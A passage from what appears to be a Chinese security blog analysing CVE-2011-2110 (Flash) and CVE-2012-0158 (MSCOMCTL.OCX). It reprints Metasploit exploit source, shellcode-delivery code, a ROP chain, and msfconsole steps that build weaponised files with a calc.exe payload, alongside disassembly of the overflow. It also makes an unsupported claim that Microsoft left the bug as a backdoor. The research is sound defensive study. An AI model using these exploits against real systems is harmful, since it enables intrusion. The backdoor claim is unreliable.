Path to a custom SSL certificate (default is randomly generated)  URIPATH                   no        The URI to use for this exploit (default is random)Payload information:  Space: 2000  Avoid: 1 charactersDescription:  This module exploits a vulnerability in Adobe Flash Player versions ***********  and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification  logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same  vulnerability that was used for attacks against Korean based organizations.    Specifically, this issue occurs when indexing an array using an arbitrary value,  memory can be referenced and later executed. Taking advantage of this issue does not rely  on heap spraying as the vulnerability can also be used for information leakage.    Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several  other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and  is very reliable.References:  https://nvd.nist.gov/vuln/detail/CVE-2011-2110  OSVDB (73007)  http://www.securityfocus.com/bid/48268  http://www.adobe.com/devnet/swf.html  http://www.adobe.com/support/security/bulletins/apsb11-18.html  http://www.accessroot.com/arteam/site/download.php?view.331  http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20110617View the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/browser/adobe_flashplayer_arrayindexing) &gt; set payload windows/execmsf6 exploit(windows/browser/adobe_flashplayer_arrayindexing) &gt; set CMD calc.exemsf6 exploit(windows/browser/adobe_flashplayer_arrayindexing) &gt; exploit\n\n随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其响应 HTML 页面和异常 swf 文件以触发漏洞\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploit/windows/browser/adobe_flashplayer_arrayindexing.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = GreatRanking  include Msf::Exploit::Remote::HttpServer::HTML  def initialize(info = &#123;&#125;)    super(update_info(info,      &#x27;Name&#x27;           =&gt; &#x27;Adobe Flash Player AVM Verification Logic Array Indexing Code Execution&#x27;,      &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,      &#x27;License&#x27;        =&gt; MSF_LICENSE,      &#x27;Author&#x27;         =&gt; [...],      &#x27;References&#x27;     =&gt; [...],      &#x27;DefaultOptions&#x27; =&gt; &#123;...&#125;,      &#x27;Payload&#x27;        =&gt; &#123;...&#125;,      &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,      &#x27;Targets&#x27;        =&gt; [...],      &#x27;DisclosureDate&#x27; =&gt; &#x27;2012-06-21&#x27;,      &#x27;DefaultTarget&#x27;  =&gt; 0))  end  def exploit    # src for the flash file: external/source/exploits/CVE-2011-2110/CVE-2011-2110.as    # full aslr/dep bypass using the info leak as per malware    path = File.join( Msf::Config.data_directory, &quot;exploits&quot;, &quot;CVE-2011-2110.swf&quot; )    fd = File.open( path, &quot;rb&quot; )    @swf = fd.read(fd.stat.size)    fd.close    super  end  def check_dependencies    use_zlib  end  def get_target(agent)    #If the user is already specified by the user, we&#x27;ll just use that    return target if target.name != &#x27;Automatic&#x27;    if agent =~ /MSIE/      return targets[0]  # ie 6/7/8 tested working    elsif agent =~ /Firefox/      return targets[0]  # ff 10.2 tested working    else      return nil    end  end  def on_request_uri(cli, request)    agent = request.headers[&#x27;User-Agent&#x27;]    my_target = get_target(agent)    # Avoid the attack if the victim doesn&#x27;t have the same setup we&#x27;re targeting    if my_target.nil?      print_error(&quot;#&#123;cli.peerhost&#125;:#&#123;cli.peerport&#125; - Browser not supported: #&#123;agent.to_s&#125;&quot;)      send_not_found(cli)      return    end    xor_byte  = 122    trigger   = @swf    trigger_file = rand_text_alpha(rand(6)+3) + &quot;.swf&quot;    code = rand_text_alpha(rand(6)+3) + &quot;.txt&quot;    sc = Zlib::Deflate.deflate(payload.encoded)    shellcode = &quot;&quot;    sc.each_byte do | c |      shellcode &lt;&lt; (xor_byte ^ c)    end    uri  = ((datastore[&#x27;SSL&#x27;]) ? &quot;https://&quot; : &quot;http://&quot;)    uri &lt;&lt; ((datastore[&#x27;SRVHOST&#x27;] == &#x27;0.0.0.0&#x27;) ? Rex::Socket.source_address(&#x27;50.50.50.50&#x27;) : datastore[&#x27;SRVHOST&#x27;])    uri &lt;&lt; &quot;:#&#123;datastore[&#x27;SRVPORT&#x27;]&#125;#&#123;get_resource()&#125;/#&#123;code&#125;&quot;    bd_uri = Zlib::Deflate.deflate(uri)    uri = &quot;&quot;    bd_uri.each_byte do | c |      uri &lt;&lt; (xor_byte ^ c)    end    bd_uri = uri.unpack(&quot;H*&quot;)[0]    obj_id = rand_text_alpha(rand(6)+3)    if request.uri.match(/\\.swf/i)      print_status(&quot;Sending malicious swf&quot;)      send_response(cli, trigger, &#123; &#x27;Content-Type&#x27; =&gt; &#x27;application/x-shockwave-flash&#x27; &#125;)      return    end    if request.uri.match(/\\.txt/i)      print_status(&quot;Sending payload&quot;)      send_response(cli, shellcode, &#123; &#x27;Content-Type&#x27; =&gt; &#x27;text/plain&#x27; &#125;)      return    end    html =  &lt;&lt;-EOS    &lt;html&gt;    &lt;head&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;center&gt;    &lt;object classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot;    id=&quot;#&#123;obj_id&#125;&quot; width=&quot;600&quot; height=&quot;400&quot;    codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab&quot;&gt;    &lt;param name=&quot;movie&quot; value=&quot;#&#123;get_resource&#125;/#&#123;trigger_file&#125;?info=#&#123;bd_uri&#125;&quot; /&gt;    &lt;embed src=&quot;#&#123;get_resource&#125;/#&#123;trigger_file&#125;?info=#&#123;bd_uri&#125;&quot; quality=&quot;high&quot;    width=&quot;320&quot; height=&quot;300&quot; name=&quot;#&#123;obj_id&#125;&quot; align=&quot;middle&quot;    allowNetworking=&quot;all&quot;    type=&quot;application/x-shockwave-flash&quot;    pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot;&gt;    &lt;/embed&gt;    &lt;/object&gt;    &lt;/center&gt;    &lt;/body&gt;    &lt;/html&gt;    EOS    html = html.gsub(/^ &#123;4&#125;/, &#x27;&#x27;)    print_status(&quot;Sending #&#123;self.name&#125; HTML&quot;)    send_response(cli, html, &#123; &#x27;Content-Type&#x27; =&gt; &#x27;text/html&#x27; &#125;)  endend\n\n可以看到 MSF 的 exp 也是利用类似于样本的 swf 文件实现漏洞利用。如果在调试时查看三次信息泄露时泄露的基址所属的内存区域，将会发现第一次泄露的是用于计算 ROP 地址的基址，第二次泄漏的是 code 对象的地址，第三次泄露的是指向 NOPsled + ROP + shellcode 的地址。最终样本将第三次泄露的地址传给 Number 对象，即以下指令达到任意代码执行的目的\nNumber(rest[0x3FFFFFBA])\n\n漏洞修复patch 添加了对参数数组索引值大小的判断，当索引值大于传递的参数数组元素个数时就跳过数组元素索引以防止越界访问\nReferenceNVD - CVE-2011-2110CVE - CVE-2011-2110漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2012-0158 漏洞研究","url":"/2024/08/18/Vulnerability%20Investigation/CVE-2012-0158-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"CVE-2012-0158 在 CVE-2017-0199 出现前的 5 年时间中总会在各大安全公司的通用漏洞榜单中名列前茅。首次被披露于 2015 年 6 月报道出的名为 “Lotus Blossom 行动” 的攻击事件。其成因是 Microsoft Windows 通用控件中的 MSCOMCTL.TreeView、MSCOMCTL.TreeView2、MSCOMCTL.ListView2、MSCOMCTL.ListView 控件（MSCOMCTL.OCX）中存在栈溢出漏洞，导致可被用于执行任意代码\n影响范围：Microsoft Office 2003 SP3版本、2007 SP2版本和SP3版本、 2010 Gold版本和SP1版本， Office 2003 Web Components SP3版本，SQL Server 2000 SP4版本、2005 SP4版本和2008 SP2版本、SP3版本和R2版本， BizTalk Server 2002 SP1版本，Commerce Server 2002 SP4版本、2007 SP2版本、2009 Gold版本和R2版本，Visual FoxPro 8.0 SP1版本和9.0 SP2版本和Visual Basic 6.0 Runtime版本\n影响的操作系统：Windows 2000, Windows Server 2003, Windows XP (32-bit), Windows Vista (32-bit), Windows 7 (32-bit)\n\n\n漏洞分析调试运行 Word 并样本后程序因访问非法地址触发 segmentation fault 而发生崩溃（gif 图来自吾爱破解精华帖）\n\n栈回溯得到的漏洞触发执行流如下（图来自安全客上的永远的经典：CVE-2012-0158漏洞分析、利用、检测和总结）\n\nOffice 在解析 ListView 控件的时候，读取并加载了控件的数据流，栈溢出的越界拷贝发生在 MSCOMCTL.OCX ReadBytesFromStreamPadded 函数中，使用 IDA 打开 MSCOMCTL.OCX 定位栈溢出时程序执行的代码\n\n漏洞模块 MSCOMCTL.OCX 只有为数不多的几个导出函数名可以参考。不过微软的很多库都有对应的公开符号参考，例如 MSDN 或其符号服务器都能下载到各个系统与版本的库以 pdb&#x2F;dbg 为拓展名的符号文件。这些符号包含源代码编译时的各种函数名、变量等参考信息。将 MSCOMCTL.OCX 与其对应的符号文件 MSCOMCTL.dbg 放在同一个目录下用 IDA 打开能够链接解析它的各个函数地址和函数名，能够很大程度上提高逆向分析过程中的代码可读性\n\n.text:275C88F4                               ; =============== S U B R O U T I N E =======================================.text:275C88F4.text:275C88F4                               ; Attributes: bp-based frame.text:275C88F4.text:275C88F4                               ; HRESULT __cdecl ReadBytesFromStreamPadded(char *, struct IStream *lpMem, SIZE_T dwBytes).text:275C88F4                               public ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z.text:275C88F4                               ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z proc near.text:275C88F4                                                                       ; CODE XREF: CNodes::Load(IStream *)+10↑p.text:275C88F4                                                                       ; CNodes::Load(IStream *)+40↑p.text:275C88F4                                                                       ; CNode::Load(IStream *)+26↓p.text:275C88F4                                                                       ; CNode::Load(IStream *)+60↓p.text:275C88F4                                                                       ; CObj::Load(IStream *)+13↓p.text:275C88F4                                                                       ; CObj::Load(IStream *)+3E↓p.text:275C88F4                                                                       ; CListItem::Load(IStream *)+21↓p.text:275C88F4                                                                       ; CListItem::Load(IStream *)+4F↓p.text:275C88F4                                                                       ; CListItem::Load(IStream *)+98↓p.text:275C88F4                                                                       ; CListItems::Load(IStream *)+10↓p.text:275C88F4                                                                       ; CListItems::Load(IStream *)+3E↓p.text:275C88F4                                                                       ; CListSubItem::Load(IStream *)+23↓p.text:275C88F4                                                                       ; CListSubItem::Load(IStream *)+51↓p.text:275C88F4                                                                       ; CListSubItem::Load(IStream *)+CC↓p.text:275C88F4                                                                       ; CListSubItems::Load(IStream *)+10↓p ....text:275C88F4.text:275C88F4                               var_4= dword ptr -4.text:275C88F4                               arg_0= dword ptr  8.text:275C88F4                               lpMem= dword ptr  0Ch.text:275C88F4                               dwBytes= dword ptr  10h.text:275C88F4.text:275C88F4                               ; FUNCTION CHUNK AT .text:275D3DDB SIZE 00000014 BYTES.text:275C88F4.text:275C88F4 55                            push    ebp.text:275C88F5 8B EC                         mov     ebp, esp.text:275C88F7 51                            push    ecx.text:275C88F8 53                            push    ebx.text:275C88F9 8B 5D 0C                      mov     ebx, [ebp+lpMem].text:275C88FC 56                            push    esi.text:275C88FD 33 F6                         xor     esi, esi.text:275C88FF 8B 03                         mov     eax, [ebx].text:275C8901 57                            push    edi.text:275C8902 56                            push    esi.text:275C8903 8D 4D FC                      lea     ecx, [ebp+var_4].text:275C8906 6A 04                         push    4.text:275C8908 51                            push    ecx.text:275C8909 53                            push    ebx.text:275C890A FF 50 0C                      call    dword ptr [eax+0Ch].text:275C890A.text:275C890D 3B C6                         cmp     eax, esi.text:275C890F 7C 78                         jl      short loc_275C8989.text:275C890F.text:275C8911 8B 7D 10                      mov     edi, [ebp+dwBytes].text:275C8914 39 7D FC                      cmp     [ebp+var_4], edi.text:275C8917 0F 85 BE B4 00 00             jnz     loc_275D3DDB.text:275C8917.text:275C891D 57                            push    edi                             ; dwBytes.text:275C891E 56                            push    esi                             ; dwFlags.text:275C891F FF 35 50 ED 62 27             push    ?g_hHeap@@3PAXA                 ; hHeap.text:275C8925 FF 15 68 11 58 27             call    ds:__imp__HeapAlloc@12          ; HeapAlloc(x,x,x).text:275C8925.text:275C892B 3B C6                         cmp     eax, esi.text:275C892D 89 45 0C                      mov     [ebp+lpMem], eax.text:275C8930 0F 84 AF B4 00 00             jz      loc_275D3DE5.text:275C8930.text:275C8936 8B 0B                         mov     ecx, [ebx].text:275C8938 56                            push    esi.text:275C8939 57                            push    edi.text:275C893A 50                            push    eax.text:275C893B 53                            push    ebx.text:275C893C FF 51 0C                      call    dword ptr [ecx+0Ch].text:275C893C.text:275C893F 8B F0                         mov     esi, eax.text:275C8941 85 F6                         test    esi, esi.text:275C8943 7C 31                         jl      short loc_275C8976.text:275C8943.text:275C8945 8B 75 0C                      mov     esi, [ebp+lpMem].text:275C8948 8B CF                         mov     ecx, edi.text:275C894A 8B 7D 08                      mov     edi, [ebp+arg_0].text:275C894D 8B C1                         mov     eax, ecx.text:275C894F C1 E9 02                      shr     ecx, 2.text:275C8952 F3 A5                         rep movsd.text:275C8954 8B C8                         mov     ecx, eax.text:275C8956 8B 45 10                      mov     eax, [ebp+dwBytes].text:275C8959 83 E1 03                      and     ecx, 3.text:275C895C 6A 00                         push    0.text:275C895E 8D 50 03                      lea     edx, [eax+3].text:275C8961 83 E2 FC                      and     edx, 0FFFFFFFCh.text:275C8964 2B D0                         sub     edx, eax.text:275C8966 F3 A4                         rep movsb.text:275C8968 8B 0B                         mov     ecx, [ebx].text:275C896A 52                            push    edx.text:275C896B 68 78 3F 63 27                push    offset ?PADBYTESBUFFER@@3_JA    ; __int64 PADBYTESBUFFER.text:275C8970 53                            push    ebx.text:275C8971 FF 51 0C                      call    dword ptr [ecx+0Ch].text:275C8971.text:275C8974 8B F0                         mov     esi, eax.text:275C8974.text:275C8976.text:275C8976                               loc_275C8976:                           ; CODE XREF: ReadBytesFromStreamPadded(char *,IStream *,ulong)+4F↑j.text:275C8976 FF 75 0C                      push    [ebp+lpMem]                     ; lpMem.text:275C8979 6A 00                         push    0                               ; dwFlags.text:275C897B FF 35 50 ED 62 27             push    ?g_hHeap@@3PAXA                 ; hHeap.text:275C8981 FF 15 74 11 58 27             call    ds:__imp__HeapFree@12           ; HeapFree(x,x,x).text:275C8981.text:275C8987 8B C6                         mov     eax, esi.text:275C8987.text:275C8989.text:275C8989                               loc_275C8989:                           ; CODE XREF: ReadBytesFromStreamPadded(char *,IStream *,ulong)+1B↑j.text:275C8989                                                                       ; ReadBytesFromStreamPadded(char *,IStream *,ulong)+B4EC↓j.text:275C8989                                                                       ; ReadBytesFromStreamPadded(char *,IStream *,ulong)+B4F6↓j.text:275C8989 5F                            pop     edi.text:275C898A 5E                            pop     esi.text:275C898B 5B                            pop     ebx.text:275C898C C9                            leave.text:275C898D C3                            retn.text:275C898D.text:275C898D                               ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z endp\n\n反编译得到\nHRESULT __cdecl ReadBytesFromStreamPadded(char *a1, struct IStream *lpMem, SIZE_T dwBytes)&#123;  HRESULT result; // eax  struct IStream *v5; // eax  int v6; // esi  int v7; // [esp+Ch] [ebp-4h] BYREF  struct IStream *lpMema; // [esp+1Ch] [ebp+Ch]  result = lpMem-&gt;lpVtbl-&gt;Read(lpMem, &amp;v7, 4, 0);  if ( result &gt;= 0 )  &#123;    if ( v7 == dwBytes )    &#123;      v5 = (struct IStream *)HeapAlloc(g_hHeap, 0, dwBytes);      lpMema = v5;      if ( v5 )      &#123;        v6 = lpMem-&gt;lpVtbl-&gt;Read(lpMem, v5, dwBytes, 0);        if ( v6 &gt;= 0 )        &#123;          qmemcpy(a1, lpMema, dwBytes);          v6 = lpMem-&gt;lpVtbl-&gt;Read(lpMem, &amp;PADBYTESBUFFER, ((dwBytes + 3) &amp; 0xFFFFFFFC) - dwBytes, 0);        &#125;        HeapFree(g_hHeap, 0, lpMema);        return v6;      &#125;      else      &#123;        return -2147024882;      &#125;    &#125;    else    &#123;      return -2147418113;    &#125;  &#125;  return result;&#125;\n\n我们注意到 ReadBytesFromStreamPadded 函数实际上是一个类似 memcpy 的内存拷贝函数。它的功能是根据参数从指定内存拷贝指定大小数据到目标内存。因此漏洞应该出现在其主调函数中，而栈溢出时，其主调函数为\n.text:275C8B4E                               ; =============== S U B R O U T I N E =======================================.text:275C8B4E.text:275C8B4E                               ; Attributes: bp-based frame.text:275C8B4E.text:275C8B4E                               ; int __stdcall CObj::Load(CObj *this, struct IStream *bstrString).text:275C8B4E                               public ?Load@CObj@@MAGJPAUIStream@@@Z.text:275C8B4E                               ?Load@CObj@@MAGJPAUIStream@@@Z proc near.text:275C8B4E                                                                       ; CODE XREF: CNode::Load(IStream *)+10↑p.text:275C8B4E                                                                       ; CListItem::Load(IStream *)+11↓p.text:275C8B4E                                                                       ; CListSubItem::Load(IStream *)+11↓p.text:275C8B4E                                                                       ; DATA XREF: .text:2758340C↑o.text:275C8B4E                                                                       ; .text:275B0504↑o.text:275C8B4E                                                                       ; .text:275E4C74↓o.text:275C8B4E.text:275C8B4E                               var_14= byte ptr -14h.text:275C8B4E                               dwBytes= dword ptr -0Ch.text:275C8B4E                               var_8= byte ptr -8.text:275C8B4E                               var_4= dword ptr -4.text:275C8B4E                               this= dword ptr  8.text:275C8B4E                               bstrString= dword ptr  0Ch.text:275C8B4E.text:275C8B4E                               ; FUNCTION CHUNK AT .text:275D2E73 SIZE 0000001D BYTES.text:275C8B4E.text:275C8B4E 55                            push    ebp.text:275C8B4F 8B EC                         mov     ebp, esp.text:275C8B51 83 EC 14                      sub     esp, 14h.text:275C8B54 53                            push    ebx.text:275C8B55 8B 5D 0C                      mov     ebx, [ebp+bstrString].text:275C8B58 56                            push    esi.text:275C8B59 57                            push    edi.text:275C8B5A 6A 0C                         push    0Ch                             ; dwBytes.text:275C8B5C 8D 45 EC                      lea     eax, [ebp+var_14].text:275C8B5F 53                            push    ebx                             ; lpMem.text:275C8B60 50                            push    eax                             ; char *.text:275C8B61 E8 8E FD FF FF                call    ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z ; ReadBytesFromStreamPadded(char *,IStream *,ulong).text:275C8B61.text:275C8B66 83 C4 0C                      add     esp, 0Ch.text:275C8B69 85 C0                         test    eax, eax.text:275C8B6B 7C 6C                         jl      short loc_275C8BD9.text:275C8B6B.text:275C8B6D 81 7D EC 43 6F 62 6A          cmp     dword ptr [ebp+var_14], 6A626F43h.text:275C8B74 0F 85 F9 A2 00 00             jnz     loc_275D2E73.text:275C8B74.text:275C8B7A 83 7D F4 08                   cmp     [ebp+dwBytes], 8.text:275C8B7E 0F 82 EF A2 00 00             jb      loc_275D2E73.text:275C8B7E.text:275C8B84 FF 75 F4                      push    [ebp+dwBytes]                   ; dwBytes.text:275C8B87 8D 45 F8                      lea     eax, [ebp+var_8].text:275C8B8A 53                            push    ebx                             ; lpMem.text:275C8B8B 50                            push    eax                             ; char *.text:275C8B8C E8 63 FD FF FF                call    ?ReadBytesFromStreamPadded@@YAJPADPAUIStream@@K@Z ; ReadBytesFromStreamPadded(char *,IStream *,ulong).text:275C8B8C.text:275C8B91 8B F0                         mov     esi, eax.text:275C8B93 83 C4 0C                      add     esp, 0Ch.text:275C8B96 85 F6                         test    esi, esi.text:275C8B98 7C 3D                         jl      short loc_275C8BD7.text:275C8B98.text:275C8B9A 83 7D F8 00                   cmp     dword ptr [ebp+var_8], 0.text:275C8B9E 8B 7D 08                      mov     edi, [ebp+this].text:275C8BA1 74 2A                         jz      short loc_275C8BCD.text:275C8BA1.text:275C8BA3 83 65 0C 00                   and     [ebp+bstrString], 0.text:275C8BA7 8D 45 0C                      lea     eax, [ebp+bstrString].text:275C8BAA 53                            push    ebx                             ; struct IStream *.text:275C8BAB 50                            push    eax                             ; len.text:275C8BAC E8 2F 00 00 00                call    ?ReadBstrFromStreamPadded@@YAJAAPAGPAUIStream@@@Z ; ReadBstrFromStreamPadded(ushort * &amp;,IStream *).text:275C8BAC.text:275C8BB1 8B F0                         mov     esi, eax.text:275C8BB3 59                            pop     ecx.text:275C8BB4 85 F6                         test    esi, esi.text:275C8BB6 59                            pop     ecx.text:275C8BB7 7C 1E                         jl      short loc_275C8BD7.text:275C8BB7.text:275C8BB9 FF 75 0C                      push    [ebp+bstrString]                ; pbstr.text:275C8BBC 8D 4F DC                      lea     ecx, [edi-24h]                  ; this.text:275C8BBF E8 F4 2D FC FF                call    ?SetKey@CObj@@QAEJPAG@Z         ; CObj::SetKey(ushort *).text:275C8BBF.text:275C8BC4 FF 75 0C                      push    [ebp+bstrString]                ; bstrString.text:275C8BC7 FF 15 40 15 58 27             call    ds:__imp__SysFreeString@4       ; SysFreeString(x).text:275C8BC7.text:275C8BCD.text:275C8BCD                               loc_275C8BCD:                           ; CODE XREF: CObj::Load(IStream *)+53↑j.text:275C8BCD 83 7D FC 00                   cmp     [ebp+var_4], 0.text:275C8BD1 0F 85 A6 A2 00 00             jnz     loc_275D2E7D.text:275C8BD1.text:275C8BD7.text:275C8BD7                               loc_275C8BD7:                           ; CODE XREF: CObj::Load(IStream *)+4A↑j.text:275C8BD7                                                                       ; CObj::Load(IStream *)+69↑j.text:275C8BD7                                                                       ; CObj::Load(IStream *)+A33D↓j.text:275C8BD7 8B C6                         mov     eax, esi.text:275C8BD7.text:275C8BD9.text:275C8BD9                               loc_275C8BD9:                           ; CODE XREF: CObj::Load(IStream *)+1D↑j.text:275C8BD9                                                                       ; CObj::Load(IStream *)+A32A↓j.text:275C8BD9 5F                            pop     edi.text:275C8BDA 5E                            pop     esi.text:275C8BDB 5B                            pop     ebx.text:275C8BDC C9                            leave.text:275C8BDD C2 08 00                      retn    8.text:275C8BDD.text:275C8BDD                               ?Load@CObj@@MAGJPAUIStream@@@Z endp.text:275C8BDD\n\n反编译得到\nHRESULT __stdcall CObj::Load(CObj *this, struct IStream *bstrString)&#123;  struct IStream *v2; // ebx  HRESULT result; // eax  HRESULT BytesFromStreamPadded; // esi  char v5[4]; // [esp+Ch] [ebp-14h] BYREF  SIZE_T dwBytes; // [esp+14h] [ebp-Ch]  char v7[4]; // [esp+18h] [ebp-8h] BYREF  int v8; // [esp+1Ch] [ebp-4h]  v2 = bstrString;  result = ReadBytesFromStreamPadded(v5, bstrString, 0xCu);  if ( result &gt;= 0 )  &#123;    if ( *(_DWORD *)v5 != &#x27;jboC&#x27; || dwBytes &lt; 8 )      return -2147418113;    BytesFromStreamPadded = ReadBytesFromStreamPadded(v7, v2, dwBytes);    if ( BytesFromStreamPadded &lt; 0 )      return BytesFromStreamPadded;    if ( *(_DWORD *)v7 )    &#123;      bstrString = 0;      BytesFromStreamPadded = ReadBstrFromStreamPadded((UINT)&amp;bstrString, v2);      if ( BytesFromStreamPadded &lt; 0 )        return BytesFromStreamPadded;      CObj::SetKey((CObj *)((char *)this - 36), (BSTR)bstrString);      SysFreeString((BSTR)bstrString);    &#125;    if ( v8 )      return ReadVariantFromStream((struct tagVARIANT *)((char *)this + 20), v2);    return BytesFromStreamPadded;  &#125;  return result;&#125;\n\n这个函数是 CObj 对象的加载方法，会先从数据流中读取 0xC 个字节到内存中，并检查其中的前四个字节是否为 Cobj 与同时被读入的 dwBytes 是否大于等于 8 。检查通过后将直接根据 dwBytes 的值进行对应大小的内存复制，复制的源地址为函数参数 bstrString\n太抽象了这个漏洞，按照补丁来看正常的 dwBytes 值应该刚好等于 8，但这里的判错条件却并非 dwBytes !&#x3D; 8 而是 dwBytes &lt; 8，以及内存复制目标 v7 的地址恰好是 ebp-8h，只要 dwBytes 的值大于 8 便必然且刚好地栈溢出。结合本漏洞初次被发现于针对东南亚国家和地区的间谍活动网络攻击事件中，很难不怀疑这是微软故意留下的后门\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2012-0158\n\n搜索结果\nMatching Modules================   #  Name                                                                                                Disclosure Date  Rank     Check  Description   -  ----                                                                                                ---------------  ----     -----  -----------   0  exploit/windows/fileformat/ms12_027_mscomctl_bof                                                    2012-04-10       average  No     MS12-027 MSCOMCTL ActiveX Buffer Overflow   1    \\_ target: Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English  .                .        .      .   2    \\_ target: Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English                  .                .        .      .Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/fileformat/ms12_027_mscomctl_bofAfter interacting with a module you can manually set a TARGET with set TARGET &#x27;Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English&#x27;\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/fileformat/ms12_027_mscomctl_bofmsf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; info\n\n模块详情信息\n       Name: MS12-027 MSCOMCTL ActiveX Buffer Overflow     Module: exploit/windows/fileformat/ms12_027_mscomctl_bof   Platform: Windows       Arch: Privileged: No    License: Metasploit Framework License (BSD)       Rank: Average  Disclosed: 2012-04-10Provided by:  Unknown  juan vazquez &lt;juan.vazquez@metasploit.com&gt;  sinn3r &lt;sinn3r@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English      1   Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] EnglishCheck supported:  NoBasic options:  Name      Current Setting  Required  Description  ----      ---------------  --------  -----------  FILENAME  msf.doc          yes       The file name.Payload information:  Space: 900  Avoid: 1 charactersDescription:  This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious  RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited  in the wild on April 2012.  This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office  2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses  &quot;msgr3en.dll&quot;, which will load after office got load, so the malicious file must  be loaded through &quot;File / Open&quot; to achieve exploitation.References:  https://nvd.nist.gov/vuln/detail/CVE-2012-0158  OSVDB (81125)  http://www.securityfocus.com/bid/52911  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-027  http://contagiodump.blogspot.com.es/2012/04/cve2012-0158-south-china-sea-insider.htmlView the full module info with the info -d command.\n\n使用该模块生成木马 PDF 文件\nmsf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; set FILENAME Crash.pdfmsf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; set payload windows/execmsf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; set CMD calc.exemsf6 exploit(windows/fileformat/ms12_027_mscomctl_bof) &gt; exploit\n\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/fileformat/ms12_027_mscomctl_bof.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote    Rank = AverageRanking    include Msf::Exploit::FILEFORMAT    def initialize(info = &#123;&#125;)        super(update_info(info,        &#x27;Name&#x27;           =&gt; &#x27;MS12-027 MSCOMCTL ActiveX Buffer Overflow&#x27;,        &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,        &#x27;License&#x27;        =&gt; MSF_LICENSE,        &#x27;Author&#x27;         =&gt; [...],        &#x27;References&#x27;     =&gt; [...],        &#x27;DefaultOptions&#x27; =&gt; &#123;...&#125;,        &#x27;Payload&#x27;        =&gt; &#123;...&#125;,        &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,        &#x27;Targets&#x27;        =&gt; [...],        &#x27;DisclosureDate&#x27; =&gt; &#x27;2012-04-10&#x27;,        &#x27;DefaultTarget&#x27; =&gt; 0))        register_options([...])    end    #* 将输入的字节数据转换为十六进制字符串并溢出 \\x 前缀    def stream(bytes)        Rex::Text.to_hex(bytes).gsub(&quot;\\\\x&quot;, &quot;&quot;)    end    #* 生成包含随机值的数组用于填充 ROP 链中的空白部分    def junk(n=1)        tmp = []        value = rand_text(4).unpack(&quot;L&quot;)[0].to_i        n.times &#123; tmp &lt;&lt; value &#125;        return tmp    end    # Ikazuchi ROP chain (msgr3en.dll)    # Credits to Abysssec    # http://abysssec.com/files/The_Arashi.pdf    #* 创建 RWX 内存区域并把 shellcode 从栈中复制到这片内存区域中执行    def create_rop_chain        rop_gadgets = [            0x3F2CB9E0, # POP ECX # RETN            0x3F10115C, # HeapCreate() IAT = 3F10115C            # EAX == HeapCreate() Address            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN            # Call HeapCreate() and Create a Executable Heap. After this call, EAX contain our Heap Address.            0x3F39AFCF, # CALL EAX # RETN            0x00040000,            0x00010000,            0x00000000,            0x3F2CB9E0, # POP ECX # RETN            0x00008000, # pop 0x00008000 into ECX            # add ECX to EAX and instead of calling HeapAlloc, now EAX point to the RWX Heap            0x3F39CB46, # ADD EAX,ECX # POP ESI # RETN            junk,            0x3F2CB9E0, # POP ECX # RETN            0x3F3B3DC0, # pop 0x3F3B3DC0 into ECX, it is a writable address.            # storing our RWX Heap Address into 0x3F3B3DC0 ( ECX ) for further use ;)            0x3F2233CC, # MOV DWORD PTR DS:[ECX],EAX # RETN            0x3F2D59DF, #POP EAX # ADD DWORD PTR DS:[EAX],ESP # RETN            0x3F3B3DC4, # pop 0x3F3B3DC4 into EAX , it is writable address with zero!                        # then we add ESP to the Zero which result in storing ESP into that address,                        # we need ESP address for copying shellcode ( which stores in Stack ),                        # and we have to get it dynamically at run-time, now with my tricky instruction, we have it!            0x3F2F18CC, # POP EAX # RETN            0x3F3B3DC4, # pop 0x3F3B3DC4 ( ESP address ) into EAX            # 